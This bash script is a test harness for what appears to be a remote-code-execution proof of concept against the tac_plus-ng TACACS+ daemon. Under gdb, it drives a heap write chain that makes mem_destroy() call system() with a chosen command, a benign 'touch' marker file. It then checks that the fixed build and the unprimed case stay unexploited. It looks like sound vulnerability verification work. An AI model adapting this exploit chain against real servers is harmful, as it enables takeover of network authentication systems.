#!/usr/bin/env bash
# W135: live-daemon chosen-command execution via the W129 write chain.
# Vulnerable: the chain writes type=0/count=1/arr->arr[0]={system,cmd} into the
# real session->mem object; mem_destroy() calls system(cmd) and a marker file
# appears. Fixed pin rejects; vulnerable with no prime has no chosen source.
set -u
cd "$(dirname "$0")"
H=$(pwd)
R=$(dirname "$H")
OS=linux-6.8.0-149-generic-x86_64
V="$R/src-plain/build/$OS/tac_plus-ng/tac_plus-ng"
VL="$R/src-plain/build/$OS/mavis"
F="$R/src-fixed-plain/build/$OS/tac_plus-ng/tac_plus-ng"
FL="$R/src-fixed-plain/build/$OS/mavis"
SYSC=${SYSTEM_ADDR:-0x7ffff7c58750}
MARKER=/tmp/tacplus-rce-marker
FAIL=0

# Heap addresses shift with the caller's environment even under gdb's ASLR
# disable. Measure them in this same shell with a benign prime+trigger, then
# use the measured values for every case below.
python3 "$H/run_gdb2.py" --bin "$V" --libdir "$VL" --port 5030 \
    --log "$H/rce-measure.log" --gdbcmd "$H/gdb-rce-w135.cmd" --client wire5.py \
    > "$H/rce-measure.stdout" 2>/dev/null
measure=$(grep '^EVAL ' "$H/rce-measure.log" | tail -1)
IN=$(printf '%s\n' "$measure" | sed -E 's/.* in=(0x[0-9a-f]+).*/\1/')
MEM=$(printf '%s\n' "$measure" | sed -E 's/.* smem=(0x[0-9a-f]+).*/\1/')
echo "measured in=$IN mem=$MEM"
case "$IN:$MEM" in
    0x*:0x*) ;;
    *) echo "FAIL address measurement"; exit 2 ;;
esac

if [ ! -x "$V" ] || [ ! -x "$F" ]; then
    echo "plain builds missing; see PROVENANCE.md"
    exit 2
fi

norm() {
    sed -E -e 's/0x[0-9a-fA-F]{12,}/0xADDR/g' -e 's/child process [0-9]+/child process PID/g' -e "s#$R#ROOT#g" "$1"
}

run_case() {
    local name="$1" bin="$2" libdir="$3" port="$4" extra="$5"
    rm -f "$MARKER"
    python3 "$H/run_gdb2.py" --bin "$bin" --libdir "$libdir" --port "$port" \
        --log "$H/rce-$name.log" --gdbcmd "$H/gdb-rce-w135.cmd" \
        --client wire9.py \
        --client-args="--in-addr $IN --mem-addr $MEM --system-addr $SYSC $extra" \
        > "$H/rce-$name.stdout" 2>/dev/null
    echo "case=$name runner_rc=$?"
    if [ -e "$MARKER" ]; then
        echo "marker=$name present" | tee -a "$H/rce-$name.stdout"
    else
        echo "marker=$name absent" | tee -a "$H/rce-$name.stdout"
    fi
}

emit() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "PASS $label"
    else
        echo "FAIL $label (pattern /$pattern/ absent)"
        FAIL=$((FAIL + 1))
    fi
}

absent() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "FAIL $label (unexpected /$pattern/)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
    fi
}

marker_ok() {
    local label="$1" want="$2" name="$3"
    if [ "$want" = present ] && [ -e "$MARKER" ]; then
        echo "PASS $label"
    elif [ "$want" = absent ] && [ ! -e "$MARKER" ]; then
        echo "PASS $label"
    else
        echo "FAIL $label (marker $want expected)"
        FAIL=$((FAIL + 1))
    fi
}

extract() {
    local name="$1"
    {
        echo "case=$name"
        grep -a -E '^(trigger sent|marker=)' "$H/rce-$name.stdout" || true
        grep -a -E '^marker=' "$H/rce-$name.stdout" || true
        # The marker status is emitted by run_case into stdout, not the runner.
        norm "$H/rce-$name.log" | grep -E \
          '^(EVAL |POST14 |DESTROY |ARR0 |\[Detaching after vfork)' | head -40
        norm "$H/rce-$name.log" | grep -E '^0xADDR:\s+"' | head -4
    }
}

echo "=== vulnerable pin + chosen-command chain ==="
run_case vuln "$V" "$VL" 5031 ""
emit vuln_eval "$H/rce-vuln.log" '^EVAL in=0xADDR session=0xADDR smem=0xADDR smemfield=0xADDR$'
emit vuln_target "$H/rce-vuln.log" '^POST14 t=0xADDR TARGET=0xADDR$'
emit vuln_destroy "$H/rce-vuln.log" '^DESTROY m=0xADDR type=0 count=1 arr=0xADDR$'
emit vuln_arr0 "$H/rce-vuln.log" '^ARR0 f=0xADDR p=0xADDR$'
emit vuln_cmd "$H/rce-vuln.log" '^0xADDR:\s+"touch /tmp/tacplus-rce-marker"$'
emit vuln_vfork "$H/rce-vuln.log" '^\[Detaching after vfork from child process'
marker_ok vuln_marker present vuln

echo "=== fixed pin + same wire input ==="
run_case fixed "$F" "$FL" 5032 ""
absent fixed_no_eval "$H/rce-fixed.log" '^EVAL |^POST14 |^DESTROY .* type=0 '
emit fixed_reply_57 "$H/rce-fixed.stdout" 'reply_len=57'
marker_ok fixed_no_marker absent fixed

echo "=== vulnerable pin + no prime ==="
run_case noprime "$V" "$VL" 5033 "--no-prime"
absent noprime_no_target "$H/rce-noprime.log" '^POST14 .* TARGET=0x5555'
emit noprime_reply_18 "$H/rce-noprime.stdout" 'reply_len=18'
marker_ok noprime_no_marker absent noprime

echo "=== normalized evidence hashes ==="
for n in vuln fixed noprime; do
    printf '%s ' "$n"
    extract "$n" | sha256sum | cut -d' ' -f1
done
echo "FAILURES=$FAIL"
exit "$FAIL"
